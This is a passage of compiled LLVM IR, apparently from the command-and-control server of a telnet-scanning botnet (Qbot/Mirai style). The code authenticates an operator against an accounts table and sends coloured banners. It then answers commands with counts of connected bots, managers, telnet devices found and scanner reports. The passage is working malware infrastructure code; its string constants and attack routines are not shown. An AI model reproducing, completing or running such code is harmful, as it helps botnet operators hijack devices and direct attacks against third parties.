  %130 = call i32 @fdgets(i8* %128, i32 2048, i32 %129)
  %131 = icmp slt i32 %130, 1
  br i1 %131, label %132, label %133

132:                                              ; preds = %127
  br label %910

133:                                              ; preds = %127
  %134 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %134)
  %135 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %136 = load i32, i32* %6, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %137
  %139 = getelementptr inbounds %struct.account, %struct.account* %138, i32 0, i32 1
  %140 = getelementptr inbounds [20 x i8], [20 x i8]* %139, i64 0, i64 0
  %141 = call i32 @strcmp(i8* %135, i8* %140) #8
  %142 = icmp ne i32 %141, 0
  br i1 %142, label %143, label %144

143:                                              ; preds = %133
  br label %147

144:                                              ; preds = %133
  %145 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %145, i8 0, i64 2048, i1 false)
  br label %165

146:                                              ; preds = %96
  br label %147

147:                                              ; preds = %146, %143
  %148 = load i32, i32* %5, align 4
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i64 5, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %152

151:                                              ; preds = %147
  br label %910

152:                                              ; preds = %147
  %153 = load i32, i32* %5, align 4
  %154 = call i64 @send(i32 %153, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.37, i64 0, i64 0), i64 44, i32 16384)
  %155 = icmp eq i64 %154, -1
  br i1 %155, label %156, label %157

156:                                              ; preds = %152
  br label %910

157:                                              ; preds = %152
  %158 = call i32 @sleep(i32 2)
  %159 = load i32, i32* %5, align 4
  %160 = call i64 @send(i32 %159, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.38, i64 0, i64 0), i64 44, i32 16384)
  %161 = icmp eq i64 %160, -1
  br i1 %161, label %162, label %163

162:                                              ; preds = %157
  br label %910

163:                                              ; preds = %157
  %164 = call i32 @sleep(i32 2)
  br label %910

165:                                              ; preds = %144
  %166 = load i8*, i8** %3, align 8
  %167 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %166) #9
  %168 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %169 = call i32 @rand() #9
  %170 = srem i32 %169, 6
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %171
  %173 = load i8*, i8** %172, align 8
  %174 = call i32 (i8*, i8*, ...) @sprintf(i8* %168, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.39, i64 0, i64 0), i8* %173) #9
  %175 = load i32, i32* %5, align 4
  %176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %177 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %178 = call i64 @strlen(i8* %177) #8
  %179 = call i64 @send(i32 %175, i8* %176, i64 %178, i32 16384)
  %180 = icmp eq i64 %179, -1
  br i1 %180, label %181, label %182

181:                                              ; preds = %165
  br label %910

182:                                              ; preds = %165
  %183 = load i32, i32* %5, align 4
  %184 = call i64 @send(i32 %183, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i64 0, i64 0), i64 14, i32 16384)
  %185 = icmp eq i64 %184, -1
  br i1 %185, label %186, label %187

186:                                              ; preds = %182
  br label %910

187:                                              ; preds = %182
  %188 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %189 = call i32 (i8*, i8*, ...) @sprintf(i8* %188, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.41, i64 0, i64 0)) #9
  %190 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %191 = call i32 (i8*, i8*, ...) @sprintf(i8* %190, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.42, i64 0, i64 0)) #9
  %192 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %193 = call i32 (i8*, i8*, ...) @sprintf(i8* %192, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.43, i64 0, i64 0)) #9
  %194 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %195 = call i32 (i8*, i8*, ...) @sprintf(i8* %194, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.44, i64 0, i64 0)) #9
  %196 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %197 = call i32 (i8*, i8*, ...) @sprintf(i8* %196, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.45, i64 0, i64 0)) #9
  %198 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %199 = call i32 (i8*, i8*, ...) @sprintf(i8* %198, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.46, i64 0, i64 0)) #9
  %200 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %201 = call i32 (i8*, i8*, ...) @sprintf(i8* %200, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.47, i64 0, i64 0)) #9
  %202 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %203 = call i32 (i8*, i8*, ...) @sprintf(i8* %202, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.48, i64 0, i64 0)) #9
  %204 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %205 = call i32 (i8*, i8*, ...) @sprintf(i8* %204, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.49, i64 0, i64 0)) #9
  %206 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %207 = call i32 (i8*, i8*, ...) @sprintf(i8* %206, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.50, i64 0, i64 0)) #9
  %208 = load i32, i32* %5, align 4
  %209 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %210 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %211 = call i64 @strlen(i8* %210) #8
  %212 = call i64 @send(i32 %208, i8* %209, i64 %211, i32 16384)
  %213 = icmp eq i64 %212, -1
  br i1 %213, label %214, label %215

214:                                              ; preds = %187
  br label %910

215:                                              ; preds = %187
  %216 = load i32, i32* %5, align 4
  %217 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %218 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %219 = call i64 @strlen(i8* %218) #8
  %220 = call i64 @send(i32 %216, i8* %217, i64 %219, i32 16384)
  %221 = icmp eq i64 %220, -1
  br i1 %221, label %222, label %223

222:                                              ; preds = %215
  br label %910

223:                                              ; preds = %215
  %224 = load i32, i32* %5, align 4
  %225 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %226 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %227 = call i64 @strlen(i8* %226) #8
  %228 = call i64 @send(i32 %224, i8* %225, i64 %227, i32 16384)
  %229 = icmp eq i64 %228, -1
  br i1 %229, label %230, label %231

230:                                              ; preds = %223
  br label %910

231:                                              ; preds = %223
  %232 = load i32, i32* %5, align 4
  %233 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %234 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %235 = call i64 @strlen(i8* %234) #8
  %236 = call i64 @send(i32 %232, i8* %233, i64 %235, i32 16384)
  %237 = icmp eq i64 %236, -1
  br i1 %237, label %238, label %239

238:                                              ; preds = %231
  br label %910

239:                                              ; preds = %231
  %240 = load i32, i32* %5, align 4
  %241 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %242 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %243 = call i64 @strlen(i8* %242) #8
  %244 = call i64 @send(i32 %240, i8* %241, i64 %243, i32 16384)
  %245 = icmp eq i64 %244, -1
  br i1 %245, label %246, label %247

246:                                              ; preds = %239
  br label %910

247:                                              ; preds = %239
  %248 = load i32, i32* %5, align 4
  %249 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %250 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %251 = call i64 @strlen(i8* %250) #8
  %252 = call i64 @send(i32 %248, i8* %249, i64 %251, i32 16384)
  %253 = icmp eq i64 %252, -1
  br i1 %253, label %254, label %255

254:                                              ; preds = %247
  br label %910

255:                                              ; preds = %247
  %256 = load i32, i32* %5, align 4
  %257 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %258 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %259 = call i64 @strlen(i8* %258) #8
  %260 = call i64 @send(i32 %256, i8* %257, i64 %259, i32 16384)
  %261 = icmp eq i64 %260, -1
  br i1 %261, label %262, label %263

262:                                              ; preds = %255
  br label %910

263:                                              ; preds = %255
  %264 = load i32, i32* %5, align 4
  %265 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %266 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %267 = call i64 @strlen(i8* %266) #8
  %268 = call i64 @send(i32 %264, i8* %265, i64 %267, i32 16384)
  %269 = icmp eq i64 %268, -1
  br i1 %269, label %270, label %271

270:                                              ; preds = %263
  br label %910

271:                                              ; preds = %263
  %272 = load i32, i32* %5, align 4
  %273 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %274 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %275 = call i64 @strlen(i8* %274) #8
  %276 = call i64 @send(i32 %272, i8* %273, i64 %275, i32 16384)
  %277 = icmp eq i64 %276, -1
  br i1 %277, label %278, label %279

278:                                              ; preds = %271
  br label %910

279:                                              ; preds = %271
  %280 = load i32, i32* %5, align 4
  %281 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %282 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %283 = call i64 @strlen(i8* %282) #8
  %284 = call i64 @send(i32 %280, i8* %281, i64 %283, i32 16384)
  %285 = icmp eq i64 %284, -1
  br i1 %285, label %286, label %287

286:                                              ; preds = %279
  br label %910

287:                                              ; preds = %279
  %288 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %289 = call i32 @rand() #9
  %290 = srem i32 %289, 6
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %291
  %293 = load i8*, i8** %292, align 8
  %294 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %295 = call i32 @rand() #9
  %296 = srem i32 %295, 6
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %297
  %299 = load i8*, i8** %298, align 8
  %300 = call i32 (i8*, i8*, ...) @sprintf(i8* %288, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.51, i64 0, i64 0), i8* %293, i8* %294, i8* %299) #9
  %301 = load i32, i32* %5, align 4
  %302 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %303 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %304 = call i64 @strlen(i8* %303) #8
  %305 = call i64 @send(i32 %301, i8* %302, i64 %304, i32 16384)
  %306 = icmp eq i64 %305, -1
  br i1 %306, label %307, label %308

307:                                              ; preds = %287
  br label %910

308:                                              ; preds = %287
  %309 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %28, i64 0, i64 0
  %310 = bitcast i8** %309 to i8*
  %311 = call i32 @rand() #9
  %312 = srem i32 %311, 5
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %313
  %315 = load i8*, i8** %314, align 8
  %316 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %317 = call i32 (i8*, i8*, ...) @sprintf(i8* %310, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.52, i64 0, i64 0), i8* %315, i8* %316) #9
  %318 = load i32, i32* %5, align 4
  %319 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %28, i64 0, i64 0
  %320 = bitcast i8** %319 to i8*
  %321 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %28, i64 0, i64 0
  %322 = bitcast i8** %321 to i8*
  %323 = call i64 @strlen(i8* %322) #8
  %324 = call i64 @send(i32 %318, i8* %320, i64 %323, i32 16384)
  %325 = icmp eq i64 %324, -1
  br i1 %325, label %326, label %327

326:                                              ; preds = %308
  br label %910

327:                                              ; preds = %308
  %328 = load i8*, i8** %3, align 8
  %329 = call i32 @pthread_create(i64* %7, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %328) #9
  %330 = load i32, i32* %5, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %331
  %333 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %332, i32 0, i32 0
  store i32 1, i32* %333, align 8
  br label %334

334:                                              ; preds = %886, %885, %327
  %335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %336 = load i32, i32* %5, align 4
  %337 = call i32 @fdgets(i8* %335, i32 2048, i32 %336)
  %338 = icmp sgt i32 %337, 0
  br i1 %338, label %339, label %909

339:                                              ; preds = %334
  %340 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %341 = call i32 @strncmp(i8* %340, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i64 0, i64 0), i64 4) #8
  %342 = icmp eq i32 %341, 0
  br i1 %342, label %351, label %343

343:                                              ; preds = %339
  %344 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %345 = call i32 @strncmp(i8* %344, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.54, i64 0, i64 0), i64 4) #8
  %346 = icmp eq i32 %345, 0
  br i1 %346, label %351, label %347

347:                                              ; preds = %343
  %348 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %349 = call i32 @strncmp(i8* %348, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.55, i64 0, i64 0), i64 4) #8
  %350 = icmp eq i32 %349, 0
  br i1 %350, label %351, label %364

351:                                              ; preds = %347, %343, %339
  %352 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %353 = call i32 @clientsConnected()
  %354 = load volatile i32, i32* @managesConnected, align 4
  %355 = call i32 (i8*, i8*, ...) @sprintf(i8* %352, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.56, i64 0, i64 0), i32 %353, i32 %354) #9
  %356 = load i32, i32* %5, align 4
  %357 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %358 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %359 = call i64 @strlen(i8* %358) #8
  %360 = call i64 @send(i32 %356, i8* %357, i64 %359, i32 16384)
  %361 = icmp eq i64 %360, -1
  br i1 %361, label %362, label %363

362:                                              ; preds = %351
  store i8* null, i8** %2, align 8
  br label %919

363:                                              ; preds = %351
  br label %364

364:                                              ; preds = %363, %347
  %365 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %366 = call i32 @strncmp(i8* %365, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.57, i64 0, i64 0), i64 6) #8
  %367 = icmp eq i32 %366, 0
  br i1 %367, label %372, label %368

368:                                              ; preds = %364
  %369 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %370 = call i32 @strncmp(i8* %369, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.58, i64 0, i64 0), i64 6) #8
  %371 = icmp eq i32 %370, 0
  br i1 %371, label %372, label %385

372:                                              ; preds = %368, %364
  %373 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %374 = load volatile i32, i32* @TELFound, align 4
  %375 = load volatile i32, i32* @scannerreport, align 4
  %376 = call i32 (i8*, i8*, ...) @sprintf(i8* %373, i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.59, i64 0, i64 0), i32 %374, i32 %375) #9
  %377 = load i32, i32* %5, align 4
  %378 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %379 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %380 = call i64 @strlen(i8* %379) #8
  %381 = call i64 @send(i32 %377, i8* %378, i64 %380, i32 16384)
  %382 = icmp eq i64 %381, -1
  br i1 %382, label %383, label %384

383:                                              ; preds = %372
  store i8* null, i8** %2, align 8
  br label %919

384:                                              ; preds = %372
  br label %385

385:                                              ; preds = %384, %368
  %386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %387 = call i32 @strncmp(i8* %386, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.60, i64 0, i64 0), i64 6) #8
  %388 = icmp eq i32 %387, 0
  br i1 %388, label %397, label %389

389:                                              ; preds = %385
  %390 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %391 = call i32 @strncmp(i8* %390, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.61, i64 0, i64 0), i64 6) #8
  %392 = icmp eq i32 %391, 0
  br i1 %392, label %397, label %393

393:                                              ; preds = %389
  %394 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %395 = call i32 @strncmp(i8* %394, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i64 0, i64 0), i64 6) #8
  %396 = icmp eq i32 %395, 0
  br i1 %396, label %397, label %408

397:                                              ; preds = %393, %389, %385
  %398 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %399 = call i32 (i8*, i8*, ...) @sprintf(i8* %398, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.63, i64 0, i64 0)) #9
  %400 = load i32, i32* %5, align 4
  %401 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %402 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %403 = call i64 @strlen(i8* %402) #8
  %404 = call i64 @send(i32 %400, i8* %401, i64 %403, i32 16384)
  %405 = icmp eq i64 %404, -1
  br i1 %405, label %406, label %407

406:                                              ; preds = %397
  store i8* null, i8** %2, align 8
  br label %919

407:                                              ; preds = %397
  br label %408

408:                                              ; preds = %407, %393
  %409 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %410 = call i32 @strncmp(i8* %409, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i64 0, i64 0), i64 5) #8
  %411 = icmp eq i32 %410, 0
  br i1 %411, label %416, label %412

412:                                              ; preds = %408
  %413 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %414 = call i32 @strncmp(i8* %413, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.65, i64 0, i64 0), i64 5) #8
  %415 = icmp eq i32 %414, 0
  br i1 %415, label %416, label %427

416:                                              ; preds = %412, %408
  %417 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %418 = call i32 (i8*, i8*, ...) @sprintf(i8* %417, i8* getelementptr inbounds ([159 x i8], [159 x i8]* @.str.66, i64 0, i64 0)) #9
  %419 = load i32, i32* %5, align 4
  %420 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %421 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %422 = call i64 @strlen(i8* %421) #8
  %423 = call i64 @send(i32 %419, i8* %420, i64 %422, i32 16384)
  %424 = icmp eq i64 %423, -1
  br i1 %424, label %425, label %426

425:                                              ; preds = %416
  store i8* null, i8** %2, align 8
  br label %919

426:                                              ; preds = %416
  br label %427

427:                                              ; preds = %426, %412
  %428 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %429 = call i32 @strncmp(i8* %428, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i64 0, i64 0), i64 4) #8
  %430 = icmp eq i32 %429, 0
  br i1 %430, label %439, label %431

431:                                              ; preds = %427
  %432 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %433 = call i32 @strncmp(i8* %432, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i64 0, i64 0), i64 4) #8
  %434 = icmp eq i32 %433, 0
  br i1 %434, label %439, label %435

435:                                              ; preds = %431
  %436 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %437 = call i32 @strncmp(i8* %436, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i64 0, i64 0), i64 4) #8
  %438 = icmp eq i32 %437, 0
  br i1 %438, label %439, label %550

439:                                              ; preds = %435, %431, %427
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %441 = call i32 (i8*, i8*, ...) @sprintf(i8* %440, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.70, i64 0, i64 0)) #9
  %442 = load i32, i32* %5, align 4
  %443 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %444 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %445 = call i64 @strlen(i8* %444) #8
  %446 = call i64 @send(i32 %442, i8* %443, i64 %445, i32 16384)
  %447 = icmp eq i64 %446, -1
  br i1 %447, label %448, label %449

448:                                              ; preds = %439
  store i8* null, i8** %2, align 8
  br label %919

449:                                              ; preds = %439
  %450 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %451 = call i32 (i8*, i8*, ...) @sprintf(i8* %450, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.71, i64 0, i64 0)) #9
  %452 = load i32, i32* %5, align 4
  %453 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %454 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %455 = call i64 @strlen(i8* %454) #8
  %456 = call i64 @send(i32 %452, i8* %453, i64 %455, i32 16384)
  %457 = icmp eq i64 %456, -1
  br i1 %457, label %458, label %459

458:                                              ; preds = %449
  store i8* null, i8** %2, align 8
  br label %919

459:                                              ; preds = %449
  %460 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %461 = call i32 (i8*, i8*, ...) @sprintf(i8* %460, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.72, i64 0, i64 0)) #9
  %462 = load i32, i32* %5, align 4
  %463 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %464 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %465 = call i64 @strlen(i8* %464) #8
  %466 = call i64 @send(i32 %462, i8* %463, i64 %465, i32 16384)
  %467 = icmp eq i64 %466, -1
  br i1 %467, label %468, label %469

468:                                              ; preds = %459
  store i8* null, i8** %2, align 8
  br label %919

469:                                              ; preds = %459
  %470 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %471 = call i32 (i8*, i8*, ...) @sprintf(i8* %470, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.73, i64 0, i64 0)) #9
  %472 = load i32, i32* %5, align 4
  %473 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %474 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %475 = call i64 @strlen(i8* %474) #8
  %476 = call i64 @send(i32 %472, i8* %473, i64 %475, i32 16384)
  %477 = icmp eq i64 %476, -1
  br i1 %477, label %478, label %479

478:                                              ; preds = %469
  store i8* null, i8** %2, align 8
  br label %919

479:                                              ; preds = %469
  %480 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %481 = call i32 (i8*, i8*, ...) @sprintf(i8* %480, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.74, i64 0, i64 0)) #9
  %482 = load i32, i32* %5, align 4
  %483 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %484 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %485 = call i64 @strlen(i8* %484) #8
  %486 = call i64 @send(i32 %482, i8* %483, i64 %485, i32 16384)
  %487 = icmp eq i64 %486, -1
  br i1 %487, label %488, label %489

488:                                              ; preds = %479
  store i8* null, i8** %2, align 8
  br label %919

489:                                              ; preds = %479
  %490 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %491 = call i32 (i8*, i8*, ...) @sprintf(i8* %490, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.75, i64 0, i64 0)) #9
  %492 = load i32, i32* %5, align 4
  %493 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %494 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %495 = call i64 @strlen(i8* %494) #8
  %496 = call i64 @send(i32 %492, i8* %493, i64 %495, i32 16384)
  %497 = icmp eq i64 %496, -1
  br i1 %497, label %498, label %499

498:                                              ; preds = %489
  store i8* null, i8** %2, align 8
  br label %919

499:                                              ; preds = %489
  %500 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %501 = call i32 (i8*, i8*, ...) @sprintf(i8* %500, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.76, i64 0, i64 0)) #9
  %502 = load i32, i32* %5, align 4
  %503 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %504 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %505 = call i64 @strlen(i8* %504) #8
  %506 = call i64 @send(i32 %502, i8* %503, i64 %505, i32 16384)
  %507 = icmp eq i64 %506, -1
  br i1 %507, label %508, label %509

508:                                              ; preds = %499
  store i8* null, i8** %2, align 8
  br label %919

509:                                              ; preds = %499
  %510 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %511 = call i32 (i8*, i8*, ...) @sprintf(i8* %510, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.77, i64 0, i64 0)) #9
  %512 = load i32, i32* %5, align 4
  %513 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %514 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %515 = call i64 @strlen(i8* %514) #8
  %516 = call i64 @send(i32 %512, i8* %513, i64 %515, i32 16384)
  %517 = icmp eq i64 %516, -1
  br i1 %517, label %518, label %519

518:                                              ; preds = %509
  store i8* null, i8** %2, align 8
  br label %919

519:                                              ; preds = %509
  %520 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %521 = call i32 (i8*, i8*, ...) @sprintf(i8* %520, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.78, i64 0, i64 0)) #9
  %522 = load i32, i32* %5, align 4
  %523 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %524 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %525 = call i64 @strlen(i8* %524) #8
  %526 = call i64 @send(i32 %522, i8* %523, i64 %525, i32 16384)
  %527 = icmp eq i64 %526, -1
  br i1 %527, label %528, label %529

528:                                              ; preds = %519
  store i8* null, i8** %2, align 8
  br label %919

529:                                              ; preds = %519
  %530 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %531 = call i32 (i8*, i8*, ...) @sprintf(i8* %530, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.79, i64 0, i64 0)) #9
  %532 = load i32, i32* %5, align 4
  %533 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %534 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %535 = call i64 @strlen(i8* %534) #8
  %536 = call i64 @send(i32 %532, i8* %533, i64 %535, i32 16384)
  %537 = icmp eq i64 %536, -1
  br i1 %537, label %538, label %539

538:                                              ; preds = %529
  store i8* null, i8** %2, align 8
  br label %919

539:                                              ; preds = %529
  %540 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %541 = call i32 (i8*, i8*, ...) @sprintf(i8* %540, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.80, i64 0, i64 0)) #9
  %542 = load i32, i32* %5, align 4
  %543 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %544 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
